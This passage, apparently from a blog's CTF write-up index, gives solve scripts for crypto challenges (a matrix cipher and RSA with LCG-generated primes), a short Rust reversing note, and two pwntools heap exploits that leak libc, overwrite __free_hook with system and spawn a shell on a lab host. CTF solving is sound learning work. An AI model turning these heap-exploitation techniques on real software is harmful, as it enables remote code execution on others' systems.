class="number">26</span>,<span class="number">32</span>,<span class="number">36</span>,<span class="number">41</span>,<span class="number">35</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">25</span>,<span class="number">27</span>],</span><br><span class="line">[<span class="number">51</span>,<span class="number">42</span>,<span class="number">69</span>,<span class="number">16</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">42</span>,<span class="number">26</span>,<span class="number">19</span>]])</span><br><span class="line"></span><br><span class="line">U = hint2/hint1</span><br><span class="line">R = (hint3/U/hint1/U/hint1/U/hint1/U/hint1).inverse()</span><br><span class="line">A = U.inverse()*E-R</span><br><span class="line">alphabet = <span class="string">&#x27;=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$!?_&#123;&#125;&lt;&gt;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    i, j = <span class="number">5</span>*k // <span class="number">11</span>, <span class="number">5</span>*k % <span class="number">11</span></span><br><span class="line">    flag+=alphabet[A[i, j]]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119153539056.png" alt="image-20241119153539056"></p><h3 id="eezzrrssaa"><a href="#eezzrrssaa" class="headerlink" title="eezzrrssaa"></a>eezzrrssaa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = <span class="number">863666614243448299685073534539782091614466038667659466359664255833879357401208752356758391473753149783695523347</span></span><br><span class="line">ps = [<span class="number">488430779430824599064935338391249442829022539899115535143196485163487049206340136142789020350176476554441378462595965038290365842362034176672340569719593003574222248527447206361459719954322885881075726676950555671635007363</span>, <span class="number">707157149197462658139117084378634522562212403870035237598970809858394732217372944239689355077884840011520921058759306333833289658731807522052892377679354636501446734633867023331470805974187027036109531714774435994689042891</span>, <span class="number">476172773176400166870512700278283739900716339392176146031791100542596627419155254113738721222559386964568077259931246639803960023216418997484355347182274626554844693011339867671881591249587444088969603398209425951467440211</span>, <span class="number">479577456885290037281759580853233626951314430312455485422558946021203602708559915552877926123425413442096439066002524196474514162220000152373758925097140843218665566655451970747063255562540421337155353658793225970423042099</span>]</span><br><span class="line">n = <span class="number">98507292107212647629392277192521724876575060525397166586602724341772322834661685719879043139101436908036967520130509456130010632959287915661915441539615555345261656834100254232656609022587219863738542204349757544278313022268849986380405350778976502504598388632375506019980481343421510001650112826277323670706717869878490374078543128198589764240329950804782453481144228576858436696625100959717702337809834581369797601972108713612318371100605389</span></span><br><span class="line">c = <span class="number">57773774305129316009141892175661507569534831447382854914588401185097291538023184369651537398951570363918970263297625149448254614479110835192103043721312687685309489008584881189077640538284919592229456061921760452134520765924458040140450750863491592935761079322474155890093610865852109521471075002695928101302724254321097314555582345987979625286958861654447780330651520542323214097640450289283886871665487690407096815701340627706657525543320274</span></span><br><span class="line">a2 = -<span class="number">721474313686950040760456718395855289332361081440581115357964297160374075412604063880198191814907640385556239775</span> % q</span><br><span class="line">b2 = -<span class="number">42522514490869169124681320640539356074221591805568832332992800925663834398026485545017374651679305179842368739</span> % q</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pwn</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, x, b </span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        ret = <span class="variable language_">self</span>.x</span><br><span class="line">        <span class="variable language_">self</span>.x = (<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.x + <span class="variable language_">self</span>.b) % q</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_prime</span>(<span class="params">pwn1,pwn2,q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        linshi = pwn2.<span class="built_in">next</span>() * q + pwn1.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">if</span> isPrime(linshi):</span><br><span class="line">            <span class="keyword">return</span> linshi</span><br><span class="line"></span><br><span class="line">p1, p2 = <span class="built_in">list</span>(), <span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ps:</span><br><span class="line">    p2 += [<span class="built_in">int</span>(i//q)]</span><br><span class="line">    p1 += [<span class="built_in">int</span>(i%q)]</span><br><span class="line">a1, b1 = <span class="number">202320232023</span>, <span class="number">320232023202</span></span><br><span class="line"></span><br><span class="line">target= <span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p1)-<span class="number">1</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    now = p1[i]</span><br><span class="line">    <span class="keyword">while</span> now != p1[i+<span class="number">1</span>]:</span><br><span class="line">        now = (a1*now+b1)%q</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">    target += [cnt]</span><br><span class="line"></span><br><span class="line">pwn1 = pwn(a1,p1[-<span class="number">1</span>],b1)</span><br><span class="line">pwn2 = pwn(a2,p2[-<span class="number">1</span>],b2)</span><br><span class="line">ps = [get_prime(pwn1,pwn2,q) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(<span class="number">0x10001</span>, n-p-q+<span class="number">1</span>)</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119153628273.png" alt="image-20241119153628273"></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h3><p>查看V8发现提示信息</p><p><img src="/img/image-20241119153713633.png" alt="image-20241119153713633"></p><p>分析V4发现需要爆破的为V8前17位字符</p><p><img src="/img/image-20241119153729241.png" alt="image-20241119153729241"></p><p><img src="/img/image-20241119153743821.png" alt="image-20241119153743821"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Your Note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">data</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;NewData: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;172.17.0.2&#x27;</span>, <span class="number">9541</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x2f8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x1f8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x2f8</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x1f8</span> + p64(<span class="number">0x201</span>))</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x2f8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(p64(heap_addr + <span class="number">0x10</span>))</span><br><span class="line">show()</span><br><span class="line">add(<span class="number">0x1f8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">add(<span class="number">0x1f8</span>, flat(&#123;<span class="number">0x4e</span>:<span class="number">7</span>&#125;, filler=<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">__free_hook_addr = libc_addr + <span class="number">0x1eee48</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x52290</span></span><br><span class="line">edit(flat(&#123;<span class="number">0x0</span>:<span class="number">1</span>, <span class="number">0x80</span>:__free_hook_addr - <span class="number">8</span>&#125;, filler=<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">show()</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(system_addr))</span><br><span class="line">delete()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119153912986.png" alt="image-20241119153912986"></p><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;172.17.0.2&#x27;</span>, <span class="number">9541</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x18</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x18</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x530</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x508</span> + p64(<span class="number">0x531</span>)[:<span class="number">6</span>])</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4d8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x530</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x4f8</span> + p64(<span class="number">0x521</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x511</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x4d8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x508</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4d8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x18</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x530</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">__free_hook_addr = libc_addr + <span class="number">0x1eee48</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x52290</span></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x4b0</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x28</span>, p64(__free_hook_addr - <span class="number">8</span>))</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x18</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">16</span>, <span class="number">0x18</span>, <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(system_addr))</span><br><span class="line">delete(<span class="number">16</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
